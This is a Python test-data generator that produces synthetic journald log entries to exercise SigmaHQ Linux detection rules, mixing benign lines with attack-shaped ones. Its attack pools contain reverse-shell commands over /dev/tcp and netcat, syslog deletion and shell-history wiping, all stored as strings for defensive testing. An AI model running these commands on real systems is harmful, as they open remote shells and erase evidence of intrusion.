"""Synthetic systemd-journal entry generators.

Two generators are exposed:

* ``generate`` (registered as ``journald``) — mixed traffic, ~60% benign
  and ~40% attack. Each attack branch plants verbatim payloads that public
  SigmaHQ ``logsource: { product: linux }`` keyword rules look for, so the
  e2e harness has reliable positive expectations to assert against.
* ``generate_benign`` (registered as ``journald_benign``) — benign-only
  traffic. Used for negative expectations: rules that fire on the attack
  dataset MUST NOT fire here.

Output shape: one journald entry per line, with the trusted-field naming
convention (uppercase, leading underscore for kernel/PID-1 stamped
fields) the ``victorialogs_journald`` pipeline maps Sigma's neutral
Linux taxonomy onto (``Image -> _EXE``, ``CommandLine -> _CMDLINE``,
``ProcessName -> _COMM``, ``Computer -> _HOSTNAME``, etc.).

Attack content lands in ``MESSAGE`` (the journal's free-form log line),
because the matching public Sigma rules are unbound ``keywords:`` filters
that query ``_msg`` — at ingest the harness copies ``MESSAGE`` into
``_msg`` so those keyword filters resolve. See
``tests/e2e/test_journald_e2e.py``.

Everything draws from ``_vocab`` for usernames, hostnames, IPs.
"""

from __future__ import annotations

import random
from collections.abc import Iterator
from typing import Any

from . import _vocab
from ._time import stamp

# ----------------------------- benign pools ---------------------------------

_BENIGN_BINARIES = (
    ("/usr/bin/sshd", "sshd"),
    ("/usr/sbin/cron", "cron"),
    ("/usr/bin/systemd", "systemd"),
    ("/usr/bin/python3", "python3"),
    ("/usr/bin/node", "node"),
    ("/usr/bin/postgres", "postgres"),
)

_BENIGN_MESSAGES = (
    "Started Daily apt download activities.",
    "Reached target Multi-User System.",
    "Accepted publickey for {user} from {ip} port 51234 ssh2: ED25519 SHA256:abcd",
    "pam_unix(cron:session): session opened for user {user}",
    "Listening on D-Bus System Message Bus Socket.",
    "Time has been changed",
    "Reloading.",
    "Starting Cleanup of Temporary Directories...",
)

_SYSLOG_FACILITIES = (3, 4, 10)  # daemon, auth, authpriv
_PRIORITIES = (3, 4, 5, 6)  # err, warn, notice, info

# ---------------------- attack payload pools (verbatim Sigma keywords) ------
#
# Each branch's MESSAGE strings contain a substring the named SigmaHQ rule's
# `keywords:` filter looks for. Branch name -> covered rule:
#
#   rev_shell      -> rules/linux/builtin/lnx_shell_susp_rev_shells.yml
#                     rules/linux/builtin/lnx_susp_dev_tcp.yml
#   sshd_error     -> rules/linux/builtin/sshd/lnx_sshd_susp_ssh.yml
#   named_error    -> rules/linux/builtin/syslog/lnx_syslog_susp_named.yml
#   crontab_replace-> rules/linux/builtin/cron/lnx_cron_crontab_file_modification.yml
#   susp_log       -> rules/linux/builtin/lnx_shell_susp_log_entries.yml
#   clear_syslog   -> rules/linux/builtin/lnx_clear_syslog.yml
#   buffer_overflow-> rules/linux/builtin/lnx_buffer_overflows.yml
#   history_tamper -> rules/linux/builtin/lnx_shell_clear_cmd_history.yml

_REV_SHELL_MSGS = (
    "exec invoked: bash -i >& /dev/tcp/{ip}/4444 0>&1",
    "exec invoked: /bin/bash -c exec 5<>/dev/tcp/{ip}/4444",
    "exec invoked: nc -e /bin/sh {ip} 4444",
    "exec invoked: cat </dev/tcp/{ip}/4444",
)

_SSHD_ERROR_MSGS = (
    "fatal: buffer_get_string: bad string",
    "Corrupted MAC on input",
    "error in libcrypto",
    "unexpected internal error",
)

_NAMED_ERROR_MSGS = (
    " dropping source port zero packet from {ip}#53",
    " denied AXFR from {ip}",
    "named[1234]: exiting (due to fatal error)",
)

_CRONTAB_REPLACE_MSGS = (
    "({user}) REPLACE ({user})",
    "({user}) REPLACE (root)",
)

_SUSP_LOG_MSGS = (
    "device eth0 entered promiscuous mode",
    "Deactivating service",
    "Oversized packet received from {ip}",
    "imuxsock begins to drop messages",
)

_CLEAR_SYSLOG_MSGS = (
    "audit: command rm -f /var/log/syslog issued by {user}",
    "audit: command mv /var/log/syslog /tmp/.s issued by {user}",
    "audit: redirect ' > /var/log/syslog' from shell",
)

_BUFFER_OVERFLOW_MSGS = (
    "kernel: stack smashing detected in /usr/bin/wuftpd",
    "kernel: attempt to execute code on stack by /usr/sbin/rpc.statd",
)

_HISTORY_TAMPER_MSGS = (
    "session command: history -c",
    "session command: rm /home/{user}/.bash_history",
    "session command: ln -sf /dev/null /home/{user}/.bash_history",
    "session command: chattr +i /home/{user}/.bash_history",
)

# Branch name, SYSLOG_IDENTIFIER (drives stream selection in some rules),
# message-template pool. Identifiers stay in the synthetic .service /
# daemon family so privacy gates don't see real homelab service names.
_ATTACK_BRANCHES: tuple[tuple[str, str, str, tuple[str, ...]], ...] = (
    ("rev_shell", "session-1.scope", "bash", _REV_SHELL_MSGS),
    ("sshd_error", "ssh.service", "sshd", _SSHD_ERROR_MSGS),
    ("named_error", "named.service", "named", _NAMED_ERROR_MSGS),
    ("crontab_replace", "cron.service", "crontab", _CRONTAB_REPLACE_MSGS),
    ("susp_log", "kernel", "kernel", _SUSP_LOG_MSGS),
    ("clear_syslog", "auditd.service", "auditd", _CLEAR_SYSLOG_MSGS),
    ("buffer_overflow", "kernel", "kernel", _BUFFER_OVERFLOW_MSGS),
    ("history_tamper", "session-1.scope", "bash", _HISTORY_TAMPER_MSGS),
)


def _benign(rng: random.Random) -> dict[str, Any]:
    exe, comm = rng.choice(_BENIGN_BINARIES)
    msg = rng.choice(_BENIGN_MESSAGES).format(
        user=_vocab.random_username(rng),
        ip=_vocab.random_rfc5737_v4(rng),
    )
    return {
        "_EXE": exe,
        "_COMM": comm,
        "_CMDLINE": f"{exe} --no-fork",
        "_HOSTNAME": _vocab.random_hostname(rng),
        "_PID": str(rng.randint(100, 65_535)),
        "_UID": "0",
        "MESSAGE": msg,
        "PRIORITY": str(rng.choice(_PRIORITIES)),
        "SYSLOG_IDENTIFIER": comm,
        "SYSLOG_FACILITY": str(rng.choice(_SYSLOG_FACILITIES)),
        "_SYSTEMD_UNIT": f"{comm}.service",
    }


def _attack(rng: random.Random) -> dict[str, Any]:
    _name, unit, ident, pool = rng.choice(_ATTACK_BRANCHES)
    msg = rng.choice(pool).format(
        user=_vocab.random_username(rng),
        ip=_vocab.random_rfc5737_v4(rng),
    )
    return {
        "_EXE": f"/usr/bin/{ident}",
        "_COMM": ident,
        "_CMDLINE": f"/usr/bin/{ident}",
        "_HOSTNAME": _vocab.random_hostname(rng),
        "_PID": str(rng.randint(100, 65_535)),
        "_UID": str(rng.choice([0, 1000])),
        "MESSAGE": msg,
        "PRIORITY": "4",
        "SYSLOG_IDENTIFIER": ident,
        "SYSLOG_FACILITY": "10",
        "_SYSTEMD_UNIT": unit,
    }


def _event(rng: random.Random, offset: int, *, attack: bool) -> dict[str, Any]:
    ev = _attack(rng) if attack else _benign(rng)
    ev["_time"] = stamp(offset)
    return ev


def generate(seed: int, count: int) -> Iterator[dict[str, Any]]:
    """Yield ``count`` synthetic journald entries seeded by ``seed``.

    ~40% of events are attack-shaped, distributed across the branches in
    ``_ATTACK_BRANCHES`` so a 5000-event run plants ~250 of each pattern.
    """
    rng = random.Random(seed)
    for i in range(count):
        attack = rng.random() < 0.40
        yield _event(rng, i, attack=attack)


def generate_benign(seed: int, count: int) -> Iterator[dict[str, Any]]:
    """Yield ``count`` benign-only journald entries.

    Used for negative e2e expectations — Linux Sigma rules that fire on
    the attack-mix dataset MUST NOT fire here.
    """
    rng = random.Random(seed)
    for i in range(count):
        yield _event(rng, i, attack=False)
